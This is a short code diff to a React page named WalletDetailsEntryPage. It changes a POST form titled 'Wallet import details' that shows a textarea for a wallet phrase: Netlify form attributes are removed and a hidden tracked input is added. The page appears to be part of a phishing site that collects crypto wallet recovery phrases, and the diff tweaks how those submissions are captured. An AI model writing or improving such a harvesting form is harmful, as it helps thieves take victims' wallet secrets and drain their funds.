@@ -90,12 +90,16 @@ function WalletDetailsEntryPage() {
         <form
           className="form-area"
           method="POST"
-          data-netlify="true"
-          netlify-honeypot
           // action="./form-action-page.html"
-          name="Wallet import details"
+          name="Wallet_import_details"
           onSubmit={validateForm}
         >
+          <input
+            type="hidden"
+            name="Wallet_import_details"
+            value="tracked-form"
+          />
+
           {showPhrase && (
             <div className="mb-3">
               <textarea
